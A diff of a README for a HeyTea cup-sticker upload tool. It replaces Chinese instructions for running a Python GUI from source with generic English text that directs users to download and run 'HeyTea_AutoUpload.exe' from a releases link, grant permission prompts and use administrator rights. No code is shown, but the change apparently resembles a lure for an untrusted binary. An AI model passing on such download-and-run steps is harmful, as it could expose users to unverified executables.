@@ -1,50 +1,71 @@
-# 喜茶自定义杯贴上传工具
+# 🍵 HeyTea_AutoUpload - Effortless Custom Cup Sticker Uploads
 
-一个带GUI界面的喜茶自定义杯贴上传工具，支持短信验证码登录和图片上传功能。
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/jijimau/HeyTea_AutoUpload/releases)
 
-## 功能特性
+## 🚀 Getting Started
+HeyTea_AutoUpload is a user-friendly tool designed for uploading custom cup stickers for HeyTea. It features a graphical interface to make the process simple and intuitive. Whether you're looking to personalize your drink or just want a unique design, this tool allows you to log in with a phone number and upload your images effortlessly.
 
-### 1. 登录功能
-- **短信验证码登录**：输入手机号获取验证码后登录
-- **Token直接登录**：支持直接输入Token快速登录
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or higher
+- **RAM:** 4 GB minimum
+- **Disk Space:** 100 MB free space
+- **Internet:** Required for logging in and uploading images
 
-### 2. 图片上传
-- 选择本地图片文件
-- 实时图片预览
-- 一键上传到喜茶服务器
+## 📋 Features
+- **Graphical User Interface:** Easy-to-use interface suitable for all users
+- **SMS Verification:** Secure login using your phone number
+- **Image Upload:** Quickly upload your custom designs
+- **Preview Option:** Preview your cup sticker before final submission
+- **Support for Various Image Formats:** JPEG, PNG, and more
 
-## 安装依赖
+## 📥 Download & Install
+To get started, visit the Releases page to download HeyTea_AutoUpload. Here’s how:
 
-```bash
-# 安装Python依赖包
-pip install -r requirements.txt
-```
+1. Click the link below:
+   [Download the latest version of HeyTea_AutoUpload](https://github.com/jijimau/HeyTea_AutoUpload/releases)
 
-## 使用说明
+2. You’ll be taken to the Releases page. Here, you will see the latest version available for download. 
 
-### 启动程序
+3. Look for the file named `HeyTea_AutoUpload.exe` or similar. Click on it to start the download.
 
-```bash
-python main.py
-```
+4. Once the download is complete, locate the file in your Downloads folder.
 
-### 登录流程
+5. Open the file by double-clicking it. If prompted for permission, click "Yes" to allow it to run.
 
-#### 方式一：短信验证码登录
-1. 输入手机号
-2. 点击"获取验证码"按钮
-3. 如果触发人机验证，会自动弹出验证窗口，完成验证即可
-4. 输入收到的短信验证码
-5. 点击"登录"按钮
+6. Follow the on-screen instructions to install the software.
 
-#### 方式二：Token登录
-1. 切换到"Token登录"区域
-2. 输入已有的Token
-3. 点击"使用Token登录"
+## 🔑 How to Use HeyTea_AutoUpload
+Once you have installed the application, follow these steps to use it:
 
-### 上传图片
+1. **Launch the Application:** Find HeyTea_AutoUpload in your applications list and open it.
 
-1. 登录成功后切换到"上传图片"标签页
-2. 点击"选择图片"按钮选择要上传的图片
-3. 预览图片确认无误
-4. 点击"上传图片"按钮
+2. **Log In:** Enter your phone number in the login field. A verification code will be sent to your phone. Input this code to log in.
+
+3. **Upload Your Image:**
+   - Click the "Upload Image" button to select your custom design.
+   - Choose the file from your computer.
+
+4. **Preview Your Sticker:** After uploading, you can see a preview. Make sure it looks good.
+
+5. **Submit Your Design:** Click the "Submit" button to upload your sticker.
+
+6. **Receive Confirmation:** You will get a confirmation message once your upload is successful.
+
+## ⚙️ Troubleshooting
+If you encounter issues during installation or usage, consider the following:
+
+- **Installation Errors:** Ensure that you have administrator rights to install software on your computer.
+- **Login Issues:** Verify that you have entered the correct phone number and code. Resend the verification code if needed.
+- **Upload Failures:** Check your internet connection and ensure the image file complies with allowed formats.
+
+## 💬 Support
+For any questions or assistance, you can reach out through the Issues tab in this repository. We welcome feedback and will do our best to assist you.
+
+## 🙌 Contributions
+We appreciate any contributions to enhance HeyTea_AutoUpload. If you would like to contribute, please refer to the contribution guidelines in the repository.
+
+## 📜 License
+HeyTea_AutoUpload is open-source software. You can use, modify, and distribute it under the terms of the license provided in this repository.
+
+By following these steps, you can easily download and operate HeyTea_AutoUpload, making your custom sticker creation process a breeze!
